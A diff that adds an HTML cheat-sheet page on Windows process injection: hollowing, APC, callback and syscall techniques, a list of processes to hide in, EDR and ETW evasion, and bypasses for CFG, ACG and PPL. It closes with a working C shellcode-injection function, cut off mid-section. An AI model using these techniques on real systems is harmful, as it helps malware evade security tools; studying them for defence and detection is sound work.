@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Process Injection Reference</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#08090c;color:#e5e7eb;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh}
+.mono{font-family:'Cascadia Code','IBM Plex Mono','Fira Code',monospace}
+.off{color:#ef4444;font-weight:600;font-size:.82em}
+.hd{padding:10px 14px 0;border-bottom:1px solid #1a1d27;background:linear-gradient(180deg,#0c0e14,#08090c)}
+.hd h1{font-size:1em;font-weight:800;background:linear-gradient(135deg,#f87171,#fb923c,#fbbf24);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.hd .sub{font-size:.62em;color:#374151}
+.st{display:flex;gap:1px;overflow-x:auto;flex-wrap:wrap}
+.sb{padding:4px 7px;border:none;cursor:pointer;border-radius:6px 6px 0 0;font-size:.66em;font-weight:600;white-space:nowrap;background:transparent;color:#374151;border-bottom:2px solid transparent;transition:all .15s}
+.sb.on{background:#111318}
+.sb[data-sc="kit"],.sb[data-sc="byp"]{border-left:2px solid #ffffff15;margin-left:4px}
+.ut{padding:0 14px;background:#0a0b10;border-bottom:1px solid #1a1d27;display:flex}
+.ub{padding:7px 12px;border:none;cursor:pointer;font-size:.7em;font-weight:600;background:transparent;color:#4b5563;border-bottom:2px solid transparent;display:flex;align-items:center;gap:4px}
+.ub.on{color:#e5e7eb;border-bottom-color:#e5e7eb}
+.cnt{font-size:.82em;background:#1f2937;padding:0 4px;border-radius:6px;color:#9ca3af}
+.ct{padding:10px 14px;overflow-x:auto}
+.fr{display:flex;align-items:flex-start;gap:0;overflow-x:auto;padding:8px 0}
+.ar{display:flex;align-items:center;padding:0 4px;flex-shrink:0}
+.ar .ln{width:24px;height:2px;background:linear-gradient(90deg,#4b5563,#9ca3af)}
+.ar .tp{color:#9ca3af;font-size:13px;margin-left:-2px}
+.ar .lb{font-size:.62em;color:#6b7280;margin-left:3px;white-space:nowrap}
+.bx{background:#0d0f14;border-radius:8px;flex-shrink:0;overflow:hidden}
+.bx-h{padding:6px 10px;font-weight:700;font-size:.8em}
+.bx-s{font-size:.65em;color:#4b5563;margin-top:1px}
+.bx-b{padding:6px 10px}
+.fd{display:flex;gap:6px;padding:1.5px 0;font-size:.78em;align-items:baseline}
+.fd.hl{background:#ffffff08;border-radius:3px;padding:2px 4px}
+.fd .tp{color:#6b7280;font-size:.82em}
+.tg{display:inline-block;padding:1px 7px;border-radius:4px;font-size:.78em;font-weight:700}
+.tg-s{padding:0 5px;font-size:.68em}
+.nt{margin:6px 0;padding:7px 10px;border-radius:6px}
+.nt .nl{font-size:.6em;font-weight:800;letter-spacing:.08em;margin-bottom:2px}
+.nt .nb{color:#d1d5db;font-size:.78em;line-height:1.4}
+.cp{border:1px solid #1f2937;border-radius:8px;overflow:hidden;margin-bottom:6px}
+.ct2{width:100%;padding:8px 12px;border:none;cursor:pointer;text-align:left;background:#0d0f14;display:flex;align-items:center;gap:8px}
+.ct2:hover{background:#111827}
+.cv{color:#6b7280;font-size:12px;transition:transform .15s;display:inline-block}
+.cv.op{transform:rotate(90deg)}
+.ct2 .tl{color:#e5e7eb;font-size:.8em;font-weight:600;flex:1}
+.cb{margin:0;padding:10px 14px;background:#080a0f;font-size:.74em;line-height:1.5;color:#a5f3fc;overflow-x:auto;border-top:1px solid #1f2937;white-space:pre;tab-size:4}
+.cb .cm{color:#4b5563}
+.cb .pp{color:#f59e0b}
+.ti{border-radius:6px;overflow:hidden;border:1px solid #1f2937;background:#0a0c10;margin-bottom:3px}
+.ti.op{border-color:#f9731640;background:#f9731608}
+.tt{width:100%;padding:6px 10px;border:none;cursor:pointer;text-align:left;background:transparent;display:flex;align-items:center;gap:6px}
+.tt .tn{font-size:.78em;font-weight:600;color:#9ca3af}
+.ti.op .tn{color:#fdba74}
+.td{padding:4px 10px 8px 26px;color:#d1d5db;font-size:.76em;line-height:1.5}
+.nb2{padding:2px 6px;border:1px solid #1f2937;border-radius:4px;cursor:pointer;background:#0d0f14;color:#4b5563;font-size:.65em}
+.ft{padding:8px 14px;border-top:1px solid #1a1d27;display:flex;gap:8px;flex-wrap:wrap;font-size:.6em}
+.dt{width:6px;height:6px;border-radius:2px;display:inline-block}
+.grd{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:8px}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+var $=function(s){return document.querySelector(s)};
+var $$=function(s){return Array.prototype.slice.call(document.querySelectorAll(s))};
+function esc(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}
+
+var SE=[
+{id:"crt",l:"A. Classic",i:"\u{1F3AF}",c:"#f87171"},
+{id:"dll",l:"B. DLL Inject",i:"\u{1F4E6}",c:"#60a5fa"},
+{id:"shc",l:"C. Shellcode",i:"\u{1F4A5}",c:"#a78bfa"},
+{id:"hol",l:"D. Hollowing",i:"\u{1F573}\uFE0F",c:"#f59e0b"},
+{id:"cbk",l:"E. Callbacks",i:"\u{1F504}",c:"#34d399"},
+{id:"adv",l:"F. Advanced",i:"\u{1F9E0}",c:"#e879f9"},
+{id:"sys",l:"G. Syscall",i:"\u26A1",c:"#fbbf24"},
+{id:"kit",l:"H. Toolkit",i:"\u{1F9F0}",c:"#f472b6"},
+{id:"byp",l:"I. Bypasses",i:"\u{1F6E1}\uFE0F",c:"#fb923c"}
+];
+
+var S={s:'crt',t:'flow'};
+
+function T(t,c,s){return '<span class="tg'+(s?' tg-s':'')+'\" style=\"background:'+c+'18;color:'+c+';border:1px solid '+c+'30\">'+t+'</span>'}
+function A(l){return '<div class="ar"><div class="ln"></div><div class="tp">&#9658;</div>'+(l?'<div class="lb">'+l+'</div>':'')+'</div>'}
+function B(t,c,b,w,s){return '<div class="bx" style="min-width:'+(w||220)+'px;max-width:'+(w?w+100:330)+'px;border:1px solid '+c+'35"><div class="bx-h" style="color:'+c+';border-bottom:1px solid '+c+'20;background:linear-gradient(135deg,'+c+'12,'+c+'05)">'+t+(s?'<div class="bx-s">'+s+'</div>':'')+'</div><div class="bx-b">'+b+'</div></div>'}
+function F(o,n,t,hl){return '<div class="fd'+(hl?' hl':'')+'\">'+(o?'<code class="mono off">'+o+'</code> ':'')+' <span style="flex:1">'+n+'</span>'+(t?'<span class="tp mono">'+t+'</span>':'')+'</div>'}
+function N(l,c,b){return '<div class="nt" style="background:'+c+'08;border:1px solid '+c+'25"><div class="nl" style="color:'+c+'">'+l+'</div><div class="nb">'+b+'</div></div>'}
+function CRD(icon,title,color,body){return '<div class="crd" style="border-radius:8px;border:1px solid '+color+'25;background:'+color+'06;overflow:hidden"><div class="crd-h" style="padding:8px 10px;color:'+color+';border-bottom:1px solid '+color+'15;font-weight:700;font-size:.76em">'+icon+' '+title+'</div><div style="padding:8px 10px;font-size:.72em;color:#d1d5db;line-height:1.5">'+body+'</div></div>'}
+
+function fCRT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f87171;letter-spacing:.06em;margin-bottom:6px">CREATEREMOTETHREAD INJECTION</div>';
+h+='<div class="fr">';
+h+=B("Target Process","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("1","OpenProcess(PROCESS_ALL_ACCESS)")+F("","or NtOpenProcess via syscall")+'</div>',200);
+h+=A("handle");
+h+=B("Allocate","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("2","VirtualAllocEx(MEM_COMMIT|RESERVE)")+F("","PAGE_READWRITE initially")+F("","Returns remote base address")+'</div>',220);
+h+=A("remote addr");
+h+=B("Write","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("3","WriteProcessMemory(payload)")+F("","Copy shellcode or DLL path")+F("","Verify bytesWritten == size")+'</div>',220);
+h+=A("written");
+h+=B("Protect","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("4","VirtualProtectEx(PAGE_EXECUTE_READ)")+F("","RW \u2192 RX (never RWX)")+F("","Skip if data-only (DLL path)")+'</div>',220);
+h+=A("executable");
+h+=B("Execute","#f87171",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("5","CreateRemoteThread(startAddr)")+F("","lpStartAddress = remote alloc")+F("","lpParameter = optional arg")+'</div>',220,"Most detected primitive");
+h+='</div>';
+h+=N("DETECTION SURFACE","#ef4444","OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread = classic injection chain. Every EDR hooks this. Use as baseline understanding, never in production.");
+return h;
+}
+
+function fDLL(){
+var h='<div style="font-size:.72em;font-weight:800;color:#60a5fa;letter-spacing:.06em;margin-bottom:6px">DLL INJECTION METHODS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4E6}","LoadLibrary via Remote Thread","#60a5fa",
+'<div style="margin-bottom:4px">Write DLL path string \u2192 CreateRemoteThread with <b style="color:#60a5fa">LoadLibraryA</b> as start address.</div>'+
+F("","1. VirtualAllocEx (RW, path length)")+F("","2. WriteProcessMemory (DLL path string)")+F("","3. CreateRemoteThread(LoadLibraryA, remotePath)")+
+'<div style="font-size:.88em;color:#f87171;margin-top:4px">\u26A0 DLL touches disk, shows in loaded modules</div>');
+h+=CRD("\u{1FA9D}","SetWindowsHookEx","#60a5fa",
+'<div style="margin-bottom:4px">Install hook in target thread \u2192 OS loads your DLL into process.</div>'+
+F("","SetWindowsHookEx(WH_KEYBOARD, hookProc, hDll, tid)")+F("","DLL loaded by system, not explicit injection")+F("","Hook proc runs in target\'s context")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Looks like normal hook, less suspicious</div>');
+h+=CRD("\u{1F4CB}","NtCreateThreadEx + LdrLoadDll","#60a5fa",
+'<div style="margin-bottom:4px">Syscall variant: write UNICODE_STRING of path, call <b style="color:#60a5fa">LdrLoadDll</b> in remote thread.</div>'+
+F("","LdrLoadDll is ntdll\'s internal LoadLibrary")+F("","Bypasses kernel32 hooks on LoadLibrary")+F("","UNICODE_STRING: {Length, MaxLen, Buffer*}")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Avoids LoadLibrary hook, still loads from disk</div>');
+h+=CRD("\u{1F4C2}","Reflective DLL Injection","#60a5fa",
+'<div style="margin-bottom:4px">DLL contains its own loader stub. No LoadLibrary, no disk, no PEB entry.</div>'+
+F("","DLL has ReflectiveLoader export")+F("","Loader parses own PE in-memory")+F("","Resolves imports, applies relocs, calls DllMain")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No disk, no module list entry, classic tradecraft</div>');
+h+='</div>';return h;
+}
+
+function fSHC(){
+var h='<div style="font-size:.72em;font-weight:800;color:#a78bfa;letter-spacing:.06em;margin-bottom:6px">SHELLCODE INJECTION VARIANTS</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4A5}","APC Injection","#a78bfa",
+'<div style="margin-bottom:4px">Queue shellcode as APC to alertable thread. Executes on next alertable wait.</div>'+
+F("","1. OpenProcess + OpenThread")+F("","2. VirtualAllocEx + WriteProcessMemory")+F("","3. QueueUserAPC(addr, hThread, 0)")+F("","Thread must enter alertable state")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 No new thread, but thread must be alertable</div>');
+h+=CRD("\u26A1","Early Bird APC","#a78bfa",
+'<div style="margin-bottom:4px">Create suspended process, APC fires before main thread runs. Before EDR hooks.</div>'+
+F("","1. CreateProcess(CREATE_SUSPENDED)")+F("","2. VirtualAllocEx + WriteProcessMemory")+F("","3. QueueUserAPC(addr, pi.hThread)")+F("","4. ResumeThread \u2192 APC fires first")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Runs before usermode hooks installed</div>');
+h+=CRD("\u{1F3AF}","Thread Hijacking","#a78bfa",
+'<div style="margin-bottom:4px">Suspend thread, redirect RIP/EIP to shellcode, resume. No new thread.</div>'+
+F("","1. SuspendThread(hThread)")+F("","2. GetThreadContext \u2192 save RIP")+F("","3. SetThreadContext(RIP = shellcode)")+F("","4. ResumeThread")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No new thread, no APC, minimal artifacts</div>');
+h+=CRD("\u{1F9F5}","NtQueueApcThreadEx (Special APC)","#a78bfa",
+'<div style="margin-bottom:4px">Win10+ Special User APCs execute immediately, no alertable wait needed.</div>'+
+F("","NtQueueApcThreadEx(hThread, 1, addr, ...)")+F("","USER_APC_OPTION = 1 forces immediate exec")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No alertable state requirement</div>');
+h+='</div>';return h;
+}
+
+function fHOL(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f59e0b;letter-spacing:.06em;margin-bottom:6px">PROCESS HOLLOWING / REPLACEMENT</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F573}\uFE0F","Classic Hollowing","#f59e0b",
+'<div style="margin-bottom:4px">Create suspended \u2192 unmap original \u2192 map payload \u2192 resume.</div>'+
+F("1","CreateProcess(CREATE_SUSPENDED)")+F("2","NtUnmapViewOfSection(imageBase)")+F("3","VirtualAllocEx at original base")+F("4","Write PE headers + sections")+F("5","Process relocations if needed")+F("6","SetThreadContext(entry point)")+F("7","ResumeThread")+
+'<div style="font-size:.88em;color:#f59e0b;margin-top:4px">\u26A0 Unmapping detectable, private memory at image base</div>');
+h+=CRD("\u{1F47B}","Process Doppelg\u00E4nging","#f59e0b",
+'<div style="margin-bottom:4px">NTFS transactions: write payload to transacted file, create section, rollback.</div>'+
+F("1","NtCreateTransaction")+F("2","CreateFileTransacted (write payload)")+F("3","NtCreateSection from transacted file")+F("4","NtRollbackTransaction (undo write)")+F("5","NtCreateProcessEx from section")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 File never exists on disk, section is image-backed</div>');
+h+=CRD("\u{1F47D}","Process Ghosting","#f59e0b",
+'<div style="margin-bottom:4px">Create file \u2192 mark delete \u2192 write payload \u2192 create section \u2192 close (deleted).</div>'+
+F("1","NtCreateFile")+F("2","NtSetInformationFile(DeletePending)")+F("3","Write payload to file")+F("4","NtCreateSection(SEC_IMAGE)")+F("5","NtClose \u2192 file deleted, section persists")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 File deleted before AV can scan</div>');
+h+=CRD("\u{1F5DD}\uFE0F","Process Herpaderping","#f59e0b",
+'<div style="margin-bottom:4px">Write payload \u2192 create section \u2192 overwrite file with benign content.</div>'+
+F("1","CreateFile + write payload")+F("2","NtCreateSection(SEC_IMAGE)")+F("3","Overwrite file with legit PE")+F("4","NtCreateProcessEx from section")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 AV scans file \u2192 sees benign content</div>');
+h+='</div>';return h;
+}
+
+function fCBK(){
+var h='<div style="font-size:.72em;font-weight:800;color:#34d399;letter-spacing:.06em;margin-bottom:6px">CALLBACK-BASED EXECUTION</div>';
+h+='<div style="margin-bottom:6px;font-size:.72em;color:#6b7280">Write shellcode, trigger via Windows callback. No CreateRemoteThread needed.</div>';
+h+='<div class="grd">';
+var cbs=[
+{n:"EnumWindows / EnumChildWindows",d:"lpEnumFunc = shellcode. System iterates windows, calls your code.",c:"#34d399",r:"Common, well-known"},
+{n:"CreateTimerQueueTimer",d:"Timer callback at shellcode addr. Self-contained, no window needed.",c:"#60a5fa",r:"Clean, timer-based"},
+{n:"PTP_WORK (Thread Pool)",d:"CreateThreadpoolWork + Submit. Runs in existing thread pool.",c:"#60a5fa",r:"Blends with workers"},
+{n:"NtSetInformationProcess",d:"Set InstrumentationCallback. Every syscall return triggers it.",c:"#e879f9",r:"Exotic, powerful"},
+{n:"Vectored Exception Handler",d:"AddVEH + trigger exception. Handler = shellcode address.",c:"#a78bfa",r:"Exception-based"},
+{n:"FLS Callback",d:"FlsAlloc with callback. Fires on FlsFree or thread exit.",c:"#f59e0b",r:"Fiber-local storage"},
+{n:"KernelCallbackTable",d:"Overwrite PEB->KernelCallbackTable. GUI message dispatch triggers code.",c:"#e879f9",r:"PEB-based, stealthy"},
+{n:"SetPropA + EnumPropsExA",d:"Store addr as window property. EnumPropsEx iterates \u2192 callback.",c:"#34d399",r:"Obscure"},
+{n:"EnumDesktops / EnumDisplayMonitors",d:"Less monitored enum callbacks. Same pattern as EnumWindows.",c:"#34d399",r:"Less monitored"},
+{n:"TLS Callback",d:"IMAGE_TLS_DIRECTORY callback. Fires before main(). Needs PE mod.",c:"#f59e0b",r:"Pre-main execution"}
+];
+cbs.forEach(function(cb){
+h+='<div style="border-radius:6px;border:1px solid '+cb.c+'20;background:'+cb.c+'06;padding:6px 10px"><div style="display:flex;justify-content:space-between;align-items:baseline"><span style="font-weight:700;color:'+cb.c+';font-size:.78em">'+cb.n+'</span><span style="font-size:.62em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+cb.r+'</span></div><div style="font-size:.7em;color:#9ca3af;margin-top:2px">'+cb.d+'</div></div>';
+});
+h+='</div>';return h;
+}
+
+function fADV(){
+var h='<div style="font-size:.72em;font-weight:800;color:#e879f9;letter-spacing:.06em;margin-bottom:6px">ADVANCED INJECTION TECHNIQUES</div>';
+h+='<div class="grd">';
+h+=CRD("\u{1F4DA}","Module Stomping","#e879f9",
+'<div style="margin-bottom:4px">Load legit DLL \u2192 overwrite .text with shellcode. Memory stays image-backed.</div>'+
+F("1","LoadLibrary(legit.dll, DONT_RESOLVE)")+F("2","Find .text section RVA + size")+F("3","VirtualProtect(RW) \u2192 write \u2192 VirtualProtect(RX)")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Scanner sees known module backing</div>');
+h+=CRD("\u{1F47B}","Phantom DLL Hollowing","#e879f9",
+'<div style="margin-bottom:4px">NtCreateSection of legit DLL \u2192 NtMapViewOfSection \u2192 overwrite. No LoadLibrary.</div>'+
+F("1","NtCreateSection(legit.dll, SEC_IMAGE)")+F("2","NtMapViewOfSection")+F("3","Patch .text with payload")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No LoadLibrary, section image-backed</div>');
+h+=CRD("\u{1F9EC}","Mapping Injection (Shared Section)","#e879f9",
+'<div style="margin-bottom:4px">NtCreateSection + map into both local and remote. Shared memory = no WriteProcessMemory.</div>'+
+F("1","NtCreateSection(SEC_COMMIT, RWX)")+F("2","Map local (RW), map remote (RX)")+F("3","memcpy to local \u2192 appears in remote")+F("4","Trigger execution in remote")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No VirtualAllocEx, no WriteProcessMemory</div>');
+h+=CRD("\u{1F3AD}","Transacted Hollowing","#e879f9",
+'<div style="margin-bottom:4px">TxF + section. Transacted file \u2192 image section \u2192 rollback \u2192 map into target.</div>'+
+F("1","NtCreateTransaction + CreateFileTransacted")+F("2","NtCreateSection(SEC_IMAGE)")+F("3","NtRollbackTransaction")+F("4","NtMapViewOfSection into target")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 Image-backed, file never persisted</div>');
+h+=CRD("\u{1F310}","Atom Bombing","#e879f9",
+'<div style="margin-bottom:4px">GlobalAddAtom stores payload \u2192 APC with GlobalGetAtomName copies to target \u2192 ROP.</div>'+
+F("1","GlobalAddAtomA(shellcode as string)")+F("2","APC: GlobalGetAtomName \u2192 RW memory")+F("3","Execute via ROP chain")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No VirtualAllocEx, no WriteProcessMemory</div>');
+h+=CRD("\u{1F5C3}\uFE0F","Mockingjay (RWX Hunt)","#e879f9",
+'<div style="margin-bottom:4px">Find DLLs with existing RWX sections. Write directly, no permission changes.</div>'+
+F("","Scan loaded modules for RWX sections")+F("","Known: msys-2.0.dll, cygwin1.dll")+F("","Write + execute, zero VirtualProtect")+
+'<div style="font-size:.88em;color:#34d399;margin-top:4px">\u2713 No alloc or protect calls at all</div>');
+h+='</div>';return h;
+}
+
+function fSYS(){
+var h='<div style="font-size:.72em;font-weight:800;color:#fbbf24;letter-spacing:.06em;margin-bottom:6px">SYSCALL-BASED INJECTION</div>';
+h+='<div style="margin-bottom:8px;font-size:.72em;color:#6b7280">Replace every API with direct/indirect syscalls. EDR hooks are in ntdll usermode \u2014 syscalls skip them.</div>';
+h+='<div class="fr">';
+h+=B("Classic Chain","#ef4444",'<div style="font-size:.72em;color:#d1d5db;line-height:1.6;text-decoration:line-through;opacity:.5">'+F("","OpenProcess")+F("","VirtualAllocEx")+F("","WriteProcessMemory")+F("","VirtualProtectEx")+F("","CreateRemoteThread")+'</div>',180,"Hooked by EDR");
+h+=A("replace");
+h+=B("Syscall Chain","#fbbf24",'<div style="font-size:.72em;color:#d1d5db;line-height:1.6">'+F("","NtOpenProcess","0x26")+F("","NtAllocateVirtualMemory","0x18")+F("","NtWriteVirtualMemory","0x3A")+F("","NtProtectVirtualMemory","0x50")+F("","NtCreateThreadEx","varies")+'</div>',220,"Direct or indirect");
+h+=A("enhance");
+h+=B("Full Evasion","#34d399",'<div style="font-size:.72em;color:#d1d5db;line-height:1.5">'+F("","Indirect syscall (JMP ntdll gadget)")+F("","Call stack spoofing")+F("","Halo\'s Gate SSN resolve")+F("","Encrypted SSN table")+F("","Per-call gadget rotation")+'</div>',220,"Gold standard");
+h+='</div>';
+h+=N("KEY INSIGHT","#fbbf24","Syscalls bypass <b>usermode</b> hooks but NOT kernel ETW. EtwTi callbacks still fire. Combine with ETW bypass + section mapping for full coverage.");
+return h;
+}
+
+function fKIT(){
+var h='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">PROCESS SELECTION & TARGETING</div>';
+h+='<div class="grd" style="margin-bottom:10px">';
+var tgts=[
+{n:"svchost.exe",d:"Multiple instances, SYSTEM. Pick right service group. Best blend-in.",c:"#34d399",r:"Preferred"},
+{n:"explorer.exe",d:"Always running, high integrity available, many threads.",c:"#34d399",r:"Common"},
+{n:"RuntimeBroker.exe",d:"Runs per UWP app. Less monitored than svchost.",c:"#60a5fa",r:"Stealthy"},
+{n:"sihost.exe",d:"Shell Infrastructure Host. User session, interactive desktop.",c:"#60a5fa",r:"User session"},
+{n:"taskhostw.exe",d:"Task Host. Legitimate child process diversity.",c:"#a78bfa",r:"Good cover"},
+{n:"dllhost.exe",d:"COM surrogate. Short-lived instances normal.",c:"#a78bfa",r:"Transient"},
+{n:"smartscreen.exe",d:"Spawned on demand. Good for Early Bird on creation.",c:"#f59e0b",r:"On-demand"},
+{n:"notepad.exe",d:"Simple, predictable. Testing only.",c:"#f87171",r:"Test only"}
+];
+tgts.forEach(function(t){
+h+='<div style="border-radius:6px;border:1px solid '+t.c+'20;background:'+t.c+'06;padding:5px 8px"><div style="display:flex;justify-content:space-between;align-items:baseline"><code class="mono" style="font-weight:700;color:'+t.c+';font-size:.76em">'+t.n+'</code><span style="font-size:.6em;color:#6b7280;background:#1f2937;padding:1px 6px;border-radius:3px">'+t.r+'</span></div><div style="font-size:.68em;color:#9ca3af;margin-top:1px">'+t.d+'</div></div>';
+});
+h+='</div>';
+h+='<div style="font-size:.72em;font-weight:800;color:#f472b6;letter-spacing:.06em;margin-bottom:6px">HANDLE ACQUISITION</div>';
+h+='<div class="fr">';
+h+=B("Enumerate","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","CreateToolhelp32Snapshot")+F("","Process32First/Next")+F("","Alt: NtQuerySystemInformation")+'</div>',200);
+h+=A("PID");
+h+=B("Open","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("","OpenProcess(access, pid)")+F("","Alt: NtOpenProcess syscall")+F("","Alt: NtDuplicateObject from csrss")+'</div>',220);
+h+=A("handle");
+h+=B("Access Rights","#f472b6",'<div style="font-size:.74em;color:#d1d5db;line-height:1.5">'+F("0x1F0FFF","PROCESS_ALL_ACCESS")+F("0x0008","VM_OPERATION")+F("0x0020","VM_WRITE")+F("0x0010","VM_READ")+F("0x0002","CREATE_THREAD")+F("0x0040","DUP_HANDLE")+'</div>',200);
+h+='</div>';return h;
+}
+
+function fBYP(){
+var h='<div class="grd">';
+h+=CRD("\u{1F50D}","ETW Bypass for Injection","#fb923c",
+'<div style="margin-bottom:4px">Kernel ETW fires on NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:120px">Usermode</b><span style="color:#6b7280">Patch EtwEventWrite</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:120px">Kernel ETW</b><span style="color:#6b7280">Cannot patch from usermode</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:120px">Mitigation</b><span style="color:#6b7280">Use section mapping (fewer events)</span></div>');
+h+=CRD("\u{1F4DA}","Call Stack Spoofing","#fb923c",
+'<div style="margin-bottom:4px">EDRs walk stack on sensitive Nt* calls. Unknown return addrs = flagged.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:120px">Synthetic frames</b><span style="color:#6b7280">Fake RBP chain through RtlUserThreadStart</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:120px">Return masking</b><span style="color:#6b7280">Push legit addrs before syscall</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#f59e0b;min-width:120px">Sleep obfuscation</b><span style="color:#6b7280">Encrypt + spoof stack while dormant</span></div>');
+h+=CRD("\u{1F6E1}\uFE0F","CFG Bypass","#fb923c",
+'<div style="margin-bottom:4px">Control Flow Guard validates indirect call targets. Callback injection must register targets.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:120px">Register target</b><span style="color:#6b7280">SetProcessValidCallTargets</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:120px">Nt* variant</b><span style="color:#6b7280">NtSetInformationVirtualMemory</span></div>');
+h+=CRD("\u{1F510}","CIG (Code Integrity Guard)","#fb923c",
+'<div style="margin-bottom:4px">BLOCK_NON_MICROSOFT_BINARIES rejects unsigned code.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:120px">ROP-only</b><span style="color:#6b7280">Chain existing signed gadgets</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:120px">Signed stomping</b><span style="color:#6b7280">Overwrite .text of MS-signed DLL</span></div>');
+h+=CRD("\u{1F6AB}","ACG (Arbitrary Code Guard)","#fb923c",
+'<div style="margin-bottom:4px">Prevents new executable memory allocation. Existing RX cannot become writable.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:120px">Data-only</b><span style="color:#6b7280">Corrupt data structures, no code exec</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:120px">ROP/JOP</b><span style="color:#6b7280">Reuse existing code gadgets</span></div>');
+h+=CRD("\u{1F441}\uFE0F","PPL (Protected Process Light)","#fb923c",
+'<div style="margin-bottom:4px">PPL processes reject OpenProcess even from admin.</div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#34d399;min-width:120px">BYOVD</b><span style="color:#6b7280">Vulnerable driver for kernel access</span></div>'+
+'<div style="display:flex;gap:8px;align-items:baseline;padding:2px 0;font-size:.92em"><b style="color:#60a5fa;min-width:120px">Patch EPROCESS</b><span style="color:#6b7280">Remove Protection field via driver</span></div>');
+h+='</div>';return h;
+}
+
+function getCodes(s){
+var C={};
+C.crt=[
+{t:"Classic CreateRemoteThread",l:"c",c:"DWORD Inject(DWORD pid, PBYTE sc, SIZE_T scLen) {\n    HANDLE hProc = OpenProcess(\n        PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD,\n        FALSE, pid);\n    PVOID mem = VirtualAllocEx(hProc, NULL, scLen,\n        MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);\n    WriteProcessMemory(hProc, mem, sc, scLen, NULL);\n    DWORD old;\n    VirtualProtectEx(hProc, mem, scLen, PAGE_EXECUTE_READ, &old);\n    HANDLE hT = CreateRemoteThread(hProc, NULL, 0,\n        (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);\n    WaitForSingleObject(hT, INFINITE);\n    CloseHandle(hT); CloseHandle(hProc);\n    return 1;\n}"},
